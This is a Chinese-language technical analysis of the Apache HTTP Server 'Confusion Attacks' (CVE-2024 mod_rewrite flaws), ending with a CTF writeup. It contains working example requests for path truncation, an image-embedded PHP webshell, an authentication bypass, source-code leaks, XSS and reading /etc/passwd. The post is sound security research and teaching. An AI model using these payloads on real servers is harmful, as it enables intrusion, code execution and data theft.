---
title: Apache HTTP Server Confusion Attacks 之技術分析
date: 2025-07-29
keywords: Apache, HTTP Server, Confusion Attacks, CVE-2024, Orange Tsai, mod_rewrite, RewriteRule, 網頁安全, 資安漏洞, Black Hat 2024, DocumentRoot, Filename Confusion, Handler Confusion, SSRF, XSS, LFI, 檔案讀取, 路徑截斷, PHP-FPM, 認證繞過, 存取控制繞過, 原始碼洩漏, CGI, 資安研究, 技術分析, CTF, STDiO24CTF, 漏洞利用, 網站安全, 伺服器安全
tag:
    - Cyber
    - Note
---

## 壹、摘要

常見的網頁伺服器包含 Apache HTTP Server、Nginx 和 IIS 等，其中 Apache HTTP Server 因開源、跨平台等優點被廣泛使用，然而卻在去年（2024）被 Orange Tsai 通報了高達 9 個漏洞，並將這類攻擊命名為「Confusion Attacks」。本技術分析報告將針對 Orange Tsai 在 Black Hat 2024 的演講《Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!》中提出的技術進行研究分析。雖然相關漏洞於新版 2.4.60 版本已進行修復，但因為許多更新修復無法向下兼容，因此若網站管理者任意更新，將可能導致許多舊有的設定失效。

## 貳、Confusion Attacks

在了解 Confusion Attacks 之前，需要先了解 Apache HTTP Server 的架構。Apache HTTP Server 由許多小模組組成（[官方共列出 132 個模組](https://httpd.apache.org/docs/2.4/mod/)），雖然這些模組各自可能不存在漏洞，但因為沒有了解模組間的實作細節，產生「交互作用」的問題，因此將其命名為「Confusion Attacks」。以下是發展出的攻擊：

1. Filename Confusion
2. DocumentRoot Confusion
3. Handler Confusion

從以上攻擊出發，他們找到了 9 個漏洞：

1. **CVE-2024-38472** - Apache HTTP Server on Windows UNC SSRF
2. **CVE-2024-39573** - Apache HTTP Server proxy encoding problem
3. **CVE-2024-38477** - Apache HTTP Server: Crash resulting in Denial of Service in mod_proxy via a malicious request
4. **CVE-2024-38476** - Apache HTTP Server may use exploitable/malicious backend application output to run local handlers via internal redirect
5. **CVE-2024-38475** - Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path
6. **CVE-2024-38474** - Apache HTTP Server weakness with encoded question marks in backreferences
7. **CVE-2024-38473** - Apache HTTP Server proxy encoding problem
8. **CVE-2023-38709** - Apache HTTP Server: HTTP response splitting
9. **CVE-2024-??????** - [redacted]

本研究分析報告將著重在「Filename Confusion」及「DocumentRoot Confusion」，並帶入 CTF 題目 Writeup 及自製的 AI 解題工具。

### 一、Filename Confusion

#### （一）路徑截斷

**漏洞觸發條件：**

* 存在 `RewriteRule` 規則進行路徑重寫
* 攻擊者可以控制 URL 路徑中的部分內容

`mod_rewrite` 模組可以透過 `RewriteRule` 語法將路徑根據規則改寫。在改寫路徑時，會透過 `splitout_queryargs()` 強制將其視為網址，導致可透過 `%3F`（`?` 的 URL 編碼）截斷路徑。

```apacheconf
RewriteRule Pattern Substitution [flags]
```

**Path:** [modules/mappers/mod_rewrite.c#L4141](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141)

```c
/*
 * Apply a single RewriteRule
 */
static int apply_rewrite_rule(rewriterule_entry *p, rewrite_ctx *ctx)
{
    ap_regmatch_t regmatch[AP_MAX_REG_MATCH];
    apr_array_header_t *rewriteconds;
    rewritecond_entry *conds;
    
    // [...]
    
    for (i = 0; i < rewriteconds->nelts; ++i) {
        rewritecond_entry *c = &conds[i];
        rc = apply_rewrite_cond(c, ctx);
        
        // [...] do the remaining stuff
        
    }
    
    /* Now adjust API's knowledge about r->filename and r->args */
    r->filename = newuri;

    if (ctx->perdir && (p->flags & RULEFLAG_DISCARDPATHINFO)) {
        r->path_info = NULL;
    }

    splitout_queryargs(r, p->flags);         // <------- [!!!] Truncate the `r->filename`
    
    // [...]
}
```

想像下方 `RewriteRule` 規則：

```apacheconf
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"
```

伺服器會依據路徑 `/user/` 之後的使用者名稱，回應相對應的個人資料檔案：

```bash
$ curl http://server/user/1Ping
# the output of file `/var/user/1Ping/profile.yml`
```

由於 `mod_rewrite` 模組的路徑改寫會將當作網址處理，因此可透過 `?` 截斷後面的 `/profile.yml`。

```bash
$ curl http://server/user/1Ping%2Fsecret.yml%3F
# the output of file `/var/user/1Ping/secret.yml`
```

#### （二）誤導 `RewriteFlag` 規則

**漏洞觸發條件：**

* 使用 `mod_rewrite` 模組且設定基於副檔名的處理規則
* 存在文件上傳功能或可控制的檔案內容
* `RewriteRule` 規則基於檔案副檔名進行比對（如 `\.php$`）

除了誤導改寫網址外，也可以嘗試誤導 `RewriteFlag` 的規則。想像網站透過以下規則處理請求，當結尾 `.php` 時，則加上相對應的處理器，也可以是加上環境變數或 `Content-Type`。

```apacheconf
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]
```

當請求一個資源 `1.gif%3fooo.php` 時，因為符合上方規則，因此會將其解析成 `php` 檔並執行，然而 `mod_rewrite` 會將其當作網址處理，因此回應資源 `1.gif`。透過此種方式，就有機會上傳帶有 PHP 惡意程式的 GIF 圖檔製作後門程式。

```bash
$ curl http://server/upload/1.gif
# Response: GIF89a <?=`id`;>

$ curl http://server/upload/1.gif%3fooo.php
# Response: GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### （三）繞過認證與存取控制

* 預設安裝 PHP-FPM
* 針對單一檔案的認證或存取控制（如 `<Files>` 指令）

在 `mod_proxy` 模組，因為模組間對於檔案名稱理解的不一致，導致認證與存取控制的繞過。

以下是一個經典的範例，它透過 `File` 語法對單一檔案加上限制，只有被驗證的使用者才能存取 `admin.php` 檔案：

```apacheconf
<Files "admin.php">
    AuthType Basic 
    AuthName "Admin Panel"
    AuthUserFile "/etc/apache2/.htpasswd"
    Require valid-user
</Files>
```

在預設有安裝 PHP-FPM 的環境中，上放設定可以直接被繞過。假設你瀏覽以下路徑：

```url
http://server/admin.php%3Fooo.php
```

認證模組會將請求的檔名與保護的檔名比對，因為 `admin.php%3Fooo.php` 與 `admin.php` 不相符，因此模組認定此請求不需要被認證。

接著因 PHP-FPM 設定結尾為 `.php` 時，會透過語法 `SetHandler` 將請求轉給 `mod_proxy`。

**Path**: /etc/apache2/mods-enabled/php8.2-fpm.conf

```apacheconf
# Using (?:pattern) instead of (pattern) is a small optimization that
# avoid capturing the matching pattern (as $1) which isn't used here
<FilesMatch ".+\.ph(?:ar|p|tml)$">
    SetHandler "proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost"
</FilesMatch>
```

`mod_proxy` 會將檔案名稱重寫成以下網址，並呼叫子模組：

```url
proxy:fcgi://127.0.0.1:9000/var/www/html/admin.php?ooo.php
```

此時後端收到的檔案名稱已經是奇怪的格式（有一個 `?`）。因此 PHP-FPM 會對其的 `?` 部分進行分隔並執行。因此會執行檔案 `/var/www/html/admin.php`，成功繞過單一檔案的認證或存取控制設定：

**Path:** [sapi/fpm/fpm/fpm_main.c#L1044](https://github.com/php/php-src/blob/ce51bfac759dedac1537f4d5666dcd33fbc4a281/sapi/fpm/fpm/fpm_main.c#L1044)

```c
#define APACHE_PROXY_FCGI_PREFIX "proxy:fcgi://"
#define APACHE_PROXY_BALANCER_PREFIX "proxy:balancer://"

if (env_script_filename &&
    strncasecmp(env_script_filename, APACHE_PROXY_FCGI_PREFIX, sizeof(APACHE_PROXY_FCGI_PREFIX) - 1) == 0) {
    /* advance to first character of hostname */
    char *p = env_script_filename + (sizeof(APACHE_PROXY_FCGI_PREFIX) - 1);
    while (*p != '\0' && *p != '/') {
        p++;    /* move past hostname and port */
    }
    if (*p != '\0') {
        /* Copy path portion in place to avoid memory leak.  Note
         * that this also affects what script_path_translated points
         * to. */
        memmove(env_script_filename, p, strlen(p) + 1);
        apache_was_here = 1;
    }
    /* ignore query string if sent by Apache (RewriteRule) */
    p = strchr(env_script_filename, '?');
    if (p) {
        *p =0;
    }
}
```

在 GitHub 上可以找到許多有潛在危險的設定。

* 限制只有內網能夠存取的檔案
    ```apacheconf
    # protect phpinfo, only allow localhost and local network access
    <Files php-info.php>
        # LOCAL ACCESS ONLY
        # Require local 

        # LOCAL AND LAN ACCESS
        Require ip 10 172 192.168
    </Files>
    ```
* 使用 `.htaccess` 阻擋的檔案
    ```apacheconf
    <Files adminer.php>
        Order Allow,Deny
        Deny from all
    </Files>
    ```

    ```apacheconf
    <Files xmlrpc.php>
        Order Allow,Deny
        Deny from all
    </Files>
    ```
* 禁止直接存取的檔案
    ```apacheconf
    <Files "cron.php">
        Deny from all
    </Files>
    ```

以上的範例均可透過 `?` 符號繞過。

### 二、DocumentRoot Confusion

漏洞利用條件：

* 危險的 RewriteRule，例如：
    ```apacheconf
    RewriteRule  "^/html/(.*)$"  "/$1.html"
    RewriteRule  "^(.*)\.(css|js|ico|svg)" "$1\.$2.gz"
    RewriteRule  "^/oldwebsite/(.*)$"  "/$1"
    RewriteCond %{REQUEST_METHOD} OPTIONS
    RewriteRule ^(.*)$ $1 [R=200,L]
    ```
* 啟用 `RewriteEngine On`
* Ubuntu/Debian 提供更多利用機會

在下方的 Httpd 設定當中，若請求 `http://server/html/about`，實際上會開啟 `/about.html` 及 DocumentRoot 下的 `/var/www/html/about.html`。

```apacheconf
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```

原始碼如下：

**Path:** [modules/mappers/mod_rewrite.c#L4939](https://github.com/apache/httpd/blob/c3ad18b7ee32da93eabaae7b94541d3c32264340/modules/mappers/mod_rewrite.c#L4939)

```apacheconf
    if(!(conf->options & OPTION_LEGACY_PREFIX_DOCROOT)) {
        uri_reduced = apr_table_get(r->notes, "mod_rewrite_uri_reduced");
    }

    if (!prefix_stat(r->filename, r->pool) || uri_reduced != NULL) {     // <------ [1] access without root
        int res;
        char *tmp = r->uri;

        r->uri = r->filename;
        res = ap_core_translate(r);             // <------ [2] access with root
        r->uri = tmp;

        if (res != OK) {
            rewritelog((r, 1, NULL, "prefixing with document_root of %s"
                        " FAILED", r->filename));

            return res;
        }

        rewritelog((r, 2, NULL, "prefixed with document_root to %s",
                    r->filename));
    }

    rewritelog((r, 1, NULL, "go-ahead with %s [OK]", r->filename));
    return OK;
}
```

如果能夠控制 `RewriteRule` 的前綴，就有機會能夠瀏覽系統上的任何檔案。以下是一些容易受影響的 `RewriteRule`：

```apacheconf
# 1 
RewriteRule  "^/html/(.*)$"  "/$1.html"

# 2 
RewriteRule  "^(.*)\.(css|js|ico|svg)" "$1\.$2.gz"

# 3
RewriteRule  "^/oldwebsite/(.*)$"  "/$1"

# 4
RewriteCond %{REQUEST_METHOD} OPTIONS
RewriteRule ^(.*)$ $1 [R=200,L]
```

接下來的範例將透過以下 `RewriteRule` 做示範：

```apacheconf
RewriteEngine On
RewriteRule  "^/html/(.*)$"  "/$1.html"
```

#### （一）原始碼洩漏

##### 1. 洩漏 CGI 原始碼

CGI 程式碼當中可能包含一些機密敏感資料，包含資料庫的帳號密碼等，CGI 程式碼執行時，是透過 `ScriptAlias` 與原始的目錄綁定，若使用絕對路徑請求，就能看到其原始碼。

```bash
$ curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi

$ curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
```

##### 2. 洩漏 PHP 原始碼

若只針對特定目錄或虛擬主機套用 PHP 環境，則可透過未啟用的虛擬主機存取 PHP 原始碼。

例如：`www.local` 及 `static.local` 兩台虛擬主機在同一台伺服器上，其中 `www.local` 負責執行 PHP，`static.local` 則只負責回應靜態的資源。因此透過以下範例可透過修改 `Host` 表頭取得 `config.php` 的原始碼。

```bash
$ curl http://www.local/config.php
# the processed result (empty) from config.php

$ curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
```

#### （二）存取任意檔案

透過不安全的 `RewriteRule` 雖然能夠讀取任意的檔案，但同時在 Apache HTTP Server 的設定檔模板中，預設禁止了根目錄的存取：

**Path:** [httpd/docs/conf/httpd.conf.in#L115](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115)

```apacheconf
<Directory />
    AllowOverride None
    Require all denied
</Directory>
```

然而，在 Debian 架構的作業系統中（例如：Ubuntu），預設允許 `/usr/share`。雖然無法直接存取到 `/ets/passwd`，但還是增加了利用的機會。

##### 1. 資訊洩漏

如果 Apache HTTP Server 安裝了 `websocketd` 服務，預設會在 `/usr/share/doc/websocketd/examples/php/` 中，放一個範例 PHP 檔 `dump-env.php`，如果伺服器為 PHP 環境，就能夠洩漏敏感的環境變數。

如果伺服器同時安裝 Nginx 或 Jetty，因為這些服務預設的 Web Root 在 `/usr/share` 下，因此就能夠取得這些服務的敏感資訊，例如 Jetty 上的 `web.xml` 設定等：

* `/usr/share/nginx/html/`
* `/usr/share/jetty9/etc/`
* `/usr/share/jetty9/webapps/`

以下為透過存取 `Davical` 套件中 `setup.php` 唯讀複本，洩漏 `phpinfo()` 內容的範例：

![alt](posts/2025-Apache-Confusion-Attacks/image3.webp)

Source: [https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/)

##### 2. XSS

在 Ubuntu Desktop 中，預設安裝了開源的辦公軟體 LibreOffice。可利用其中的檔案來執行 XSS。

**Path: /usr/share/libreoffice/help/help.html**

```apacheconf
var url = window.location.href;
var n = url.indexOf('?');
if (n != -1) {
    // the URL came from LibreOffice help (F1)
    var version = getParameterByName("Version", url);
    var query = url.substr(n + 1, url.length);
    var newURL = version + '/index.html?' + query;
    window.location.replace(newURL);
} else {
    window.location.replace('latest/index.html');
}
```

可以透過不安全的 `RewriteRule` 達成 XSS 攻擊：

```url
http://server/html/usr/share/libreoffice/help/help.html%3F?Version=javascript:alert(1)//
```

![alt](posts/2025-Apache-Confusion-Attacks/image4.webp)

Source: [https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/)

##### 3. LFI

如果伺服器安裝了一些套件，例如 JpGraph、jQuery-jFeed、WordPress 或 Moodle 外掛等，他們自帶的一些工具或文件也可以作為利用的對象，包含：

* `/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php`
* `/usr/share/javascript/jquery-jfeed/proxy.php`
* `/usr/share/moodle/mod/assignment/type/wims/getcsv.php`

以下為透過 jQuery-jFeed 中 `proxy.php` 檔讀取任意檔案的請求範例：

```bash
$ curl http://server/html/usr/sharejavascript/jquery-jfeed/proxy.php%3F?url=/etc/passwd&foo
# the content of /etc/passwd
```

##### 4. SSRF

除此之外，也可以透過以下檔案進行 SSRF：

* `/usr/share/php/magpierss/scripts/magpie_debug.php`

## 參、深入學習

### 一、CTF 練習

為了達到自己嘗試實作的目的，我找到了在 STDiO24CTF 中的題目 [01_Confusion](https://drive.google.com/uc?id=1Ja7va0_gm2FDCf0ueVGKCIcff53Qoaew)，並成功取得 Flag，Writeup 如下：

**STDiO24CTF 01_Confusion Writeup**

1. 偵查：此網站提供了一個上傳檔案的功能，雖然有限制只能上傳 jpg、png、gif 或 bmp 格式的檔案，但不會利用檔案內容作為判斷依據。
2. 偵查：在 `default-site.conf` 中，使用了不安全的 `RewriteRule`，因此可存取 DocumentRoot 以外的其他路徑。並且在存取上傳的 Exploit 時，需要在結尾加上 `%3F.php`，使其以 PHP 進行解析執行。
    ![alt](posts/2025-Apache-Confusion-Attacks/image5.webp)
3. 武裝：製作帶有惡意 PHP 程式碼的 Exploit 圖片。
    ```bash
    $ echo "<?php echo system('env'); ?>" > exploit.gif
    ```
4. 傳遞：上傳 Exploit 並得到上傳後的檔名為 `Meme-688656d968aa36.47347853.gif`。
    ![alt](posts/2025-Apache-Confusion-Attacks/image6.webp)
5. 攻擊：依據原始碼 `index.php`，檔案會被上傳到路徑 `/var/www/uploads/` 中。因此存取路徑 `http://localhost:1337/var/www/uploads/Meme-688656d968aa36.47347853.gif%3F.php` 得到 Flag。
    ![alt](posts/2025-Apache-Confusion-Attacks/image7.webp)

### 二、專案

隨著漏洞的公開，未來將有機會出現許多類似的 CTF 題型。因此我製作了檢測工具及 AI Prompt。請見：[https://github.com/1PingSun/Apache-Confusion-Attacks-Detector](https://github.com/1PingSun/Apache-Confusion-Attacks-Detector)。

## 肆、參考資料

1. Black Hat（2025 年 1 月 30 日）。Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!。YouTube。[https://youtu.be/euO9WbYHm0s](https://youtu.be/euO9WbYHm0s)
2. Orange Tsai（2024 年 8 月 9 日）。Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!。Orange Tsai。[https://blog.orange.tw/posts/2024-08-confusion-attacks-en/](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)